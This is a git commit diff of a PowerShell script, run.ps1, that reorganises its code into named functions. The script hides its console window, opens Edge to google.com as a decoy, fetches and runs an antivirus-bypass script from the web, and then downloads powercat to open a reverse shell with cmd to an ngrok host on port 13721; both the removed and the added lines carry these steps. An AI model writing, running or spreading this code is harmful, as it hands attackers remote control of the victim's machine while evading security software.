db4f939950eea71f8addd0154cdd20ba556bd798
Osman Kandemir <juanter53@hotmail.com>
2022-10-24 17:47:40 +0300

    Update run.ps1
    added functions with task names.

--- run.ps1
+++ run.ps1
@@ -1,16 +1,40 @@
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
-$consolePtr = [Console.Window]::GetConsoleWindow()
-[Console.Window]::ShowWindow($consolePtr, 0)
 
-start microsoft-edge:http://google.com
-$wshell = New-Object -ComObject wscript.shell;
-$wshell.AppActivate('Google - Microsoft Edge')
+Function HideConsole(){
+	
+		Add-Type -Name Window -Namespace Console -MemberDefinition '
+		[DllImport("Kernel32.dll")]
+		public static extern IntPtr GetConsoleWindow();
+		[DllImport("user32.dll")]
+		public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
+		$consolePtr = [Console.Window]::GetConsoleWindow()
+		[Console.Window]::ShowWindow($consolePtr, 0)
+}
 
-IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); 
-Invoke-AlokS-AvBypass;
 
-IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 13721 -e cmd
+Function OpenMicrosoftEdge(){
+	start microsoft-edge:http://google.com
+	$wshell = New-Object -ComObject wscript.shell;
+	$wshell.AppActivate('Google - Microsoft Edge')
+}
+
+
+Function DefenderByPass(){
+	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/aloksaurabh/OffenPowerSh/master/Bypass/Invoke-AlokS-AvBypass.ps1'); 
+	Invoke-AlokS-AvBypass;
+}
+
+
+Function ReverseShell(){
+	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 13721 -e cmd
+
+}
+
+Function RunScripts(){
+	HideConsole
+	OpenMicrosoftEdge
+	DefenderByPass
+	ReverseShell
+
+}
+
+RunScripts
